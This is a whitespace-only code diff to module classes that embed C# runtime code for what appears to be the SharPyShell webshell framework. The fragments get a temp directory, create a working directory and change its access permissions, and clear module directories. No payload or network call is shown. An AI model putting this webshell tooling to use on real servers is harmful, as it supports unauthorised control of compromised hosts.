@@ -10,7 +10,7 @@ class GetTempDirectory(Module):
     _runtime_code = r"""
                 using System;using System.IO;using System.Diagnostics;using System.Text;
                 public class SharPyShell
-                {                    
+                {
                     private string GetTempDirectory()
                     {
                         string tempDirectory="";
@@ -25,7 +25,7 @@ class GetTempDirectory(Module):
                                 tempDirectory=@"C:\Windows\Temp";
                         return tempDirectory;
                     }
-                    
+
                     public byte[] ExecRuntime()
                     {
                         string output_func=GetTempDirectory();
@@ -48,9 +48,9 @@ class GetEnvDirectory(Module):
     _runtime_code = r"""
                 using System;using System.IO;using System.Diagnostics;using System.Text;
                 using System.Security.AccessControl;using System.Security.Principal;
-                
+
                 public class SharPyShell
-                {                    
+                {
                     private string GetEnvDirectory(string randomName)
                     {
                         string envDirectory="";
@@ -68,7 +68,7 @@ class GetEnvDirectory(Module):
                             catch{
                                 envDirectory = @"C:\Windows\Temp";
                             }
-                        } 
+                        }
                         if(envDirectory != @"C:\Windows\Temp"){
                             DirectoryInfo dInfo = new DirectoryInfo(envDirectory);
                             DirectorySecurity dSecurity = dInfo.GetAccessControl();
@@ -104,7 +104,7 @@ class ClearDirectories(Module):
     _runtime_code = r"""
                 using System;using System.IO;using System.Diagnostics;using System.Text;
                 public class SharPyShell
-                {                    
+                {
                     private string ClearDirectories(string[] modulesPath, string envDirectory)
                     {
                         string output="";
